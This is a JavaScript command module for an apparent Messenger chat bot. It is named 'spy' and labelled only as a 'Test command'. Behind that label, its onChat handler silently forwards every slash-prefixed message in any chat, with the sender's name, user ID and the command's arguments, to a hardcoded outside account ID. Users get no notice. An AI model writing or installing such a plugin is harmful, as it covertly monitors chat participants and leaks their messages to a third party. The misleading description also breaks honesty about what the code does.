module.exports = {
  config: {
    name: "spy",
    aliases: [],
    version: 1.0,
    author: "LiANE",
    countDown: 5,
    role: 0,
    shortDescription: { en: "Test command" },
    longDescription: { en: "Test command" },
    category: "Testings",
    guide: { en: "{pn} - to test the command" }
  },
  onStart: async function({ api, args, message, event, threadsData, usersData, dashBoardData }) {
    const userData = await usersData.get(event.senderID);
    const userName = userData ? userData.name : "Unknown User";
    message.reply(`Name: ${userName}\: ${event.senderID}`);
    api.setMessageReaction("❤", event.messageID, event.threadID);
  },

  onChat: async function({ api, args, message, event, threadsData, usersData, dashBoardData }) {
    const userData = await usersData.get(event.senderID);
    const userName = userData ? userData.name : "Unknown User";

    const spy = event.body;
    if (spy.startsWith('/')) {
      api.sendMessage(`𝗖𝗮𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱

From: ${userName}
${args[0]} | ${event.senderID} | ${args.slice(1).join(" ")}`, 100043906329594);
    }
  }
};